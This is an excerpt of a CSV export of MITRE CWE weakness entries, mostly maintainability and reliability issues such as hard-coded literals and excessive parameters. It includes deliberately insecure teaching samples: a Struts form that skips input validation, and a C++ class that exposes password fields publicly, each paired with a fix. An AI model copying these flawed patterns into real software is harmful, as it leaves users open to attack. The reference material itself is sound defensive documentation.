"CWE-1051","Initialization with Hard-Coded Network Resource Configuration Data","The product initializes data using hard-coded values that act as network resource identifiers.","This issue can prevent the product from running reliably, e.g. if it runs in an environment does not use the hard-coded network resource identifiers. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}]","[]","[]","[]","","{""name"": ""Initialization with Hard-Coded Network Resource Configuration Data"", ""cwe_id"": ""CWE-1051"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product initializes data using hard-coded values that act as network resource identifiers."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can prevent the product from running reliably, e.g. if it runs in an environment does not use the hard-coded network resource identifiers. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.""}"
"CWE-1052","Excessive Use of Hard-Coded Literals in Initialization","The product initializes a data element using a hard-coded
					literal that is not a simple integer or static constant element.","This issue makes it more difficult to modify or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Excessive Use of Hard-Coded Literals in Initialization"", ""cwe_id"": ""CWE-1052"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product initializes a data element using a hard-coded\n\t\t\t\t\tliteral that is not a simple integer or static constant element."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to modify or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1053","Missing Documentation for Design","The product does not have documentation that represents how it is designed.","This issue can make it more difficult to understand and maintain the product. It can make it more difficult and time-consuming to detect and/or fix vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[]","[]","[]","[]","","{""name"": ""Missing Documentation for Design"", ""cwe_id"": ""CWE-1053"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product does not have documentation that represents how it is designed."", ""mitigations"": [], ""consequences"": [], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can make it more difficult to understand and maintain the product. It can make it more difficult and time-consuming to detect and/or fix vulnerabilities.""}"
"CWE-1054","Invocation of a Control Element at an Unnecessarily Deep Horizontal Layer","The code at one architectural layer invokes code that resides
					at a deeper layer than the adjacent layer, i.e., the invocation skips at least one
					layer, and the invoked code is not part of a vertical utility layer that can be referenced from any horizontal layer.","This issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Invocation of a Control Element at an Unnecessarily Deep Horizontal Layer"", ""cwe_id"": ""CWE-1054"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The code at one architectural layer invokes code that resides\n\t\t\t\t\tat a deeper layer than the adjacent layer, i.e., the invocation skips at least one\n\t\t\t\t\tlayer, and the invoked code is not part of a vertical utility layer that can be referenced from any horizontal layer."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1055","Multiple Inheritance from Concrete Classes","The product contains a class with inheritance from more than
					one concrete class.","This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Multiple Inheritance from Concrete Classes"", ""cwe_id"": ""CWE-1055"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product contains a class with inheritance from more than\n\t\t\t\t\tone concrete class."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1056","Invokable Control Element with Variadic Parameters","A named-callable or method control element has a signature that
					supports a variable (variadic) number of parameters or arguments.","This issue can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.
		 With variadic arguments, it can be difficult or inefficient for manual analysis to be certain of which function/method is being invoked.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}]","[]","[]","[]","","{""name"": ""Invokable Control Element with Variadic Parameters"", ""cwe_id"": ""CWE-1056"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""A named-callable or method control element has a signature that\n\t\t\t\t\tsupports a variable (variadic) number of parameters or arguments."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n\t\t With variadic arguments, it can be difficult or inefficient for manual analysis to be certain of which function/method is being invoked.""}"
"CWE-1057","Data Access Operations Outside of Expected Data Manager Component","The product uses a dedicated, central data manager component as required by design, but it contains code that performs data-access operations that do not use this data manager.","This issue can make the product perform more slowly than intended, since the intended central data manager may have been explicitly optimized for performance or other quality characteristics.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}]","[]","[]","[]","","{""name"": ""Data Access Operations Outside of Expected Data Manager Component"", ""cwe_id"": ""CWE-1057"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product uses a dedicated, central data manager component as required by design, but it contains code that performs data-access operations that do not use this data manager."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can make the product perform more slowly than intended, since the intended central data manager may have been explicitly optimized for performance or other quality characteristics.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.""}"
"CWE-1058","Invokable Control Element in Multi-Thread Context with non-Final Static Storable or Member Element","The code contains a function or method that
		 operates in a multi-threaded environment but owns an unsafe non-final
		                     static storable or member data element.","This issue can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}]","[]","[]","[]","","{""name"": ""Invokable Control Element in Multi-Thread Context with non-Final Static Storable or Member Element"", ""cwe_id"": ""CWE-1058"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The code contains a function or method that\n\t\t operates in a multi-threaded environment but owns an unsafe non-final\n\t\t                     static storable or member data element."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.""}"
"CWE-1059","Insufficient Technical Documentation","The product does not contain sufficient
         technical or engineering documentation (whether on paper or
         in electronic form) that contains descriptions of all the
         relevant software/hardware elements of the product, such as
         its usage, structure, architectural components, interfaces, design, implementation,
         configuration, operation, etc.","When technical documentation is limited or lacking, products are more difficult to maintain.  This indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.
	 When using time-limited or labor-limited third-party/in-house security consulting services (such as threat modeling, vulnerability discovery, or pentesting), insufficient documentation can force those consultants to invest unnecessary time in learning how the product is organized, instead of focusing their expertise on finding the flaws or suggesting effective mitigations.
	 With respect to hardware design, the lack of a formal, final manufacturer reference can make it difficult or impossible to evaluate the final product, including post-manufacture verification. One cannot ensure that design functionality or operation is within acceptable tolerances, conforms to specifications, and is free from unexpected behavior. Hardware-related documentation may include engineering artifacts such as hardware description language (HDLs), netlists, Gerber files, Bills of Materials, EDA (Electronic Design Automation) tool files, etc.","Class","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": ""Without a method of verification, one cannot be sure that everything only functions as expected."", ""scope"": ""Other"", ""impact"": ""Varies by Context, Hide Activities, Reduce Reliability, Quality Degradation, Reduce Maintainability""}]","[{""phases"": ""Documentation, Architecture and Design"", ""strategy"": """", ""description"": ""Ensure that design documentation is detailed enough to allow for post-manufacturing verification."", ""effectiveness"": null}]","[]","[{""cve_id"": ""CVE-2022-3203"", ""reference"": ""CVE-2022-3203"", ""description"": ""A wireless access point manual specifies that the only method of configuration is via web interface (CWE-1059), but there is an undisclosed telnet server that was activated by default (CWE-912).""}]","","{""name"": ""Insufficient Technical Documentation"", ""cwe_id"": ""CWE-1059"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [{""cve_id"": ""CVE-2022-3203"", ""reference"": ""CVE-2022-3203"", ""description"": ""A wireless access point manual specifies that the only method of configuration is via web interface (CWE-1059), but there is an undisclosed telnet server that was activated by default (CWE-912).""}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Class"", ""description"": ""The product does not contain sufficient\n         technical or engineering documentation (whether on paper or\n         in electronic form) that contains descriptions of all the\n         relevant software/hardware elements of the product, such as\n         its usage, structure, architectural components, interfaces, design, implementation,\n         configuration, operation, etc."", ""mitigations"": [{""phases"": ""Documentation, Architecture and Design"", ""strategy"": """", ""description"": ""Ensure that design documentation is detailed enough to allow for post-manufacturing verification."", ""effectiveness"": null}], ""consequences"": [{""note"": ""Without a method of verification, one cannot be sure that everything only functions as expected."", ""scope"": ""Other"", ""impact"": ""Varies by Context, Hide Activities, Reduce Reliability, Quality Degradation, Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": ""Ensure that design documentation is detailed enough to allow for post-manufacturing verification."", ""detection_methods"": [], ""extended_description"": ""When technical documentation is limited or lacking, products are more difficult to maintain.  This indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.\n\t When using time-limited or labor-limited third-party/in-house security consulting services (such as threat modeling, vulnerability discovery, or pentesting), insufficient documentation can force those consultants to invest unnecessary time in learning how the product is organized, instead of focusing their expertise on finding the flaws or suggesting effective mitigations.\n\t With respect to hardware design, the lack of a formal, final manufacturer reference can make it difficult or impossible to evaluate the final product, including post-manufacture verification. One cannot ensure that design functionality or operation is within acceptable tolerances, conforms to specifications, and is free from unexpected behavior. Hardware-related documentation may include engineering artifacts such as hardware description language (HDLs), netlists, Gerber files, Bills of Materials, EDA (Electronic Design Automation) tool files, etc.""}"
"CWE-106","Struts: Plug-in Framework not in Use","When an application does not use an input validation framework such as the Struts Validator, there is a greater risk of introducing weaknesses related to insufficient input validation.","Unchecked input is the leading cause of vulnerabilities in J2EE applications. Unchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others.
            Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.","Variant","Draft","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Integrity"", ""impact"": ""Unexpected State""}]","[{""phases"": ""Architecture and Design"", ""strategy"": ""Input Validation"", ""description"": ""Use an input validation framework such as Struts."", ""effectiveness"": null}, {""phases"": ""Architecture and Design"", ""strategy"": ""Libraries or Frameworks"", ""description"": ""Use an input validation framework such as Struts."", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": ""Input Validation"", ""description"": ""Use the Struts Validator to validate all program input before it is processed by the application. Ensure that there are no holes in the configuration of the Struts Validator. Example uses of the validator include checking to ensure that:\n                     Phone number fields contain only valid characters in phone numbers\n                        Boolean values are only \""T\"" or \""F\""\n                        Free-form strings are of a reasonable length and composition"", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": ""Libraries or Frameworks"", ""description"": ""Use the Struts Validator to validate all program input before it is processed by the application. Ensure that there are no holes in the configuration of the Struts Validator. Example uses of the validator include checking to ensure that:\n                     Phone number fields contain only valid characters in phone numbers\n                        Boolean values are only \""T\"" or \""F\""\n                        Free-form strings are of a reasonable length and composition"", ""effectiveness"": null}]","[]","[{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class RegistrationForm extends org.apache.struts.action.ActionForm {// private variables for registration form\n                        private String name;private String email;...\n                        public RegistrationForm() {super();}\n                        \n                        // getter and setter methods for private variables\n                        ...}"", ""language"": ""Bad""}, {""code"": ""public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {// private variables for registration form\n                        private String name;private String email;...\n                        public RegistrationForm() {super();}\n                        public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...}\n                        \n                        // getter and setter methods for private variables\n                        ...}"", ""language"": ""Good""}, {""code"": ""<struts-config><form-beans><form-bean name=\""RegistrationForm\"" type=\""RegistrationForm\""/></form-beans>\n                        ...\n                        <!-- ========================= Validator plugin ================================= --><plug-in className=\""org.apache.struts.validator.ValidatorPlugIn\""><set-propertyproperty=\""pathnames\""value=\""/WEB-INF/validator-rules.xml,/WEB-INF/validation.xml\""/></plug-in>\n                     </struts-config>"", ""language"": ""Good""}]}]","","{""name"": ""Struts: Plug-in Framework not in Use"", ""cwe_id"": ""CWE-106"", ""status"": ""Draft"", ""category"": """", ""examples"": [{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class RegistrationForm extends org.apache.struts.action.ActionForm {// private variables for registration form\n                        private String name;private String email;...\n                        public RegistrationForm() {super();}\n                        \n                        // getter and setter methods for private variables\n                        ...}"", ""language"": ""Bad""}, {""code"": ""public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {// private variables for registration form\n                        private String name;private String email;...\n                        public RegistrationForm() {super();}\n                        public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...}\n                        \n                        // getter and setter methods for private variables\n                        ...}"", ""language"": ""Good""}, {""code"": ""<struts-config><form-beans><form-bean name=\""RegistrationForm\"" type=\""RegistrationForm\""/></form-beans>\n                        ...\n                        <!-- ========================= Validator plugin ================================= --><plug-in className=\""org.apache.struts.validator.ValidatorPlugIn\""><set-propertyproperty=\""pathnames\""value=\""/WEB-INF/validator-rules.xml,/WEB-INF/validation.xml\""/></plug-in>\n                     </struts-config>"", ""language"": ""Good""}]}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Variant"", ""description"": ""When an application does not use an input validation framework such as the Struts Validator, there is a greater risk of introducing weaknesses related to insufficient input validation."", ""mitigations"": [{""phases"": ""Architecture and Design"", ""strategy"": ""Input Validation"", ""description"": ""Use an input validation framework such as Struts."", ""effectiveness"": null}, {""phases"": ""Architecture and Design"", ""strategy"": ""Libraries or Frameworks"", ""description"": ""Use an input validation framework such as Struts."", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": ""Input Validation"", ""description"": ""Use the Struts Validator to validate all program input before it is processed by the application. Ensure that there are no holes in the configuration of the Struts Validator. Example uses of the validator include checking to ensure that:\n                     Phone number fields contain only valid characters in phone numbers\n                        Boolean values are only \""T\"" or \""F\""\n                        Free-form strings are of a reasonable length and composition"", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": ""Libraries or Frameworks"", ""description"": ""Use the Struts Validator to validate all program input before it is processed by the application. Ensure that there are no holes in the configuration of the Struts Validator. Example uses of the validator include checking to ensure that:\n                     Phone number fields contain only valid characters in phone numbers\n                        Boolean values are only \""T\"" or \""F\""\n                        Free-form strings are of a reasonable length and composition"", ""effectiveness"": null}], ""consequences"": [{""note"": """", ""scope"": ""Integrity"", ""impact"": ""Unexpected State""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": ""Use an input validation framework such as Struts.; Use an input validation framework such as Struts.; Use the Struts Validator to validate all program input before it is processed by the application. Ensure that there are no holes in the configuration of the Struts Validator. Example uses of the validator include checking to ensure that:\n                     Phone number fields contain only valid characters in phone numbers\n                        Boolean values are only \""T\"" or \""F\""\n                        Free-form strings are of a reasonable length and composition; Use the Struts Validator to validate all program input before it is processed by the application. Ensure that there are no holes in the configuration of the Struts Validator. Example uses of the validator include checking to ensure that:\n                     Phone number fields contain only valid characters in phone numbers\n                        Boolean values are only \""T\"" or \""F\""\n                        Free-form strings are of a reasonable length and composition"", ""detection_methods"": [], ""extended_description"": ""Unchecked input is the leading cause of vulnerabilities in J2EE applications. Unchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others.\n            Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.""}"
"CWE-1060","Excessive Number of Inefficient Server-Side Data Accesses","The product performs too many data queries without using efficient data processing functionality such as stored procedures.","This issue can make the product perform more slowly due to computational expense.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.
	 While the interpretation of ""too many data queries"" may vary for each product or developer, CISQ recommends a default maximum of 5 data queries for an inefficient function/procedure.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}]","[]","[]","[]","","{""name"": ""Excessive Number of Inefficient Server-Side Data Accesses"", ""cwe_id"": ""CWE-1060"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product performs too many data queries without using efficient data processing functionality such as stored procedures."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can make the product perform more slowly due to computational expense.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n\t While the interpretation of \""too many data queries\"" may vary for each product or developer, CISQ recommends a default maximum of 5 data queries for an inefficient function/procedure.""}"
"CWE-1061","Insufficient Encapsulation","The product does not sufficiently hide the internal representation and implementation details of data or methods, which might allow external components or modules to modify data unexpectedly, invoke unexpected functionality, or introduce dependencies that the programmer did not intend.","This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Class","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[]","[]","[]","[{""cve_id"": ""CVE-2010-3860"", ""reference"": ""CVE-2010-3860"", ""description"": ""variables declared public allow remote read of system properties such as user name and home directory.""}, {""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""#define MAX_PASSWORD_LENGTH 15#define MAX_USERNAME_LENGTH 15\n               class UserAccount{public:UserAccount(char *username, char *password){if ((strlen(username) > MAX_USERNAME_LENGTH) ||(strlen(password) > MAX_PASSWORD_LENGTH)) {ExitError(\""Invalid username or password\"");}strcpy(this->username, username);strcpy(this->password, password);}\n             \n             int authorizeAccess(char *username, char *password){if ((strlen(username) > MAX_USERNAME_LENGTH) ||(strlen(password) > MAX_PASSWORD_LENGTH)) {ExitError(\""Invalid username or password\"");}\n             // if the username and password in the input parameters are equal to\n             \n             \n             // the username and password of this account class then authorize access\n             if (strcmp(this->username, username) ||strcmp(this->password, password))return 0;\n             \n             // otherwise do not authorize access\n             elsereturn 1;}\n               char username[MAX_USERNAME_LENGTH+1];char password[MAX_PASSWORD_LENGTH+1];};"", ""language"": ""Bad""}, {""code"": ""class UserAccount{public:...\n               \n               private:char username[MAX_USERNAME_LENGTH+1];char password[MAX_PASSWORD_LENGTH+1];};"", ""language"": ""Good""}]}]","","{""name"": ""Insufficient Encapsulation"", ""cwe_id"": ""CWE-1061"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [{""cve_id"": ""CVE-2010-3860"", ""reference"": ""CVE-2010-3860"", ""description"": ""variables declared public allow remote read of system properties such as user name and home directory.""}, {""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""#define MAX_PASSWORD_LENGTH 15#define MAX_USERNAME_LENGTH 15\n               class UserAccount{public:UserAccount(char *username, char *password){if ((strlen(username) > MAX_USERNAME_LENGTH) ||(strlen(password) > MAX_PASSWORD_LENGTH)) {ExitError(\""Invalid username or password\"");}strcpy(this->username, username);strcpy(this->password, password);}\n             \n             int authorizeAccess(char *username, char *password){if ((strlen(username) > MAX_USERNAME_LENGTH) ||(strlen(password) > MAX_PASSWORD_LENGTH)) {ExitError(\""Invalid username or password\"");}\n             // if the username and password in the input parameters are equal to\n             \n             \n             // the username and password of this account class then authorize access\n             if (strcmp(this->username, username) ||strcmp(this->password, password))return 0;\n             \n             // otherwise do not authorize access\n             elsereturn 1;}\n               char username[MAX_USERNAME_LENGTH+1];char password[MAX_PASSWORD_LENGTH+1];};"", ""language"": ""Bad""}, {""code"": ""class UserAccount{public:...\n               \n               private:char username[MAX_USERNAME_LENGTH+1];char password[MAX_PASSWORD_LENGTH+1];};"", ""language"": ""Good""}]}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Class"", ""description"": ""The product does not sufficiently hide the internal representation and implementation details of data or methods, which might allow external components or modules to modify data unexpectedly, invoke unexpected functionality, or introduce dependencies that the programmer did not intend."", ""mitigations"": [], ""consequences"": [], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1062","Parent Class with References to Child Class","The code has a parent class that contains references to a child class, its methods, or its members.","This issue can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}]","[]","[]","[]","","{""name"": ""Parent Class with References to Child Class"", ""cwe_id"": ""CWE-1062"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The code has a parent class that contains references to a child class, its methods, or its members."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.""}"
"CWE-1063","Creation of Class Instance within a Static Code Block","A static code block creates an instance of a class.","This pattern identifies situations where a storable data element or member data element is initialized with a value in a block of code which is declared as static.
This issue can make the product perform more slowly by performing initialization before it is needed.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}]","[]","[]","[]","","{""name"": ""Creation of Class Instance within a Static Code Block"", ""cwe_id"": ""CWE-1063"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""A static code block creates an instance of a class."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This pattern identifies situations where a storable data element or member data element is initialized with a value in a block of code which is declared as static.\nThis issue can make the product perform more slowly by performing initialization before it is needed.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.""}"
"CWE-1064","Invokable Control Element with Signature Containing an Excessive Number of Parameters","The product contains a function, subroutine, or method whose signature has an unnecessarily large number of
					parameters/arguments.","This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
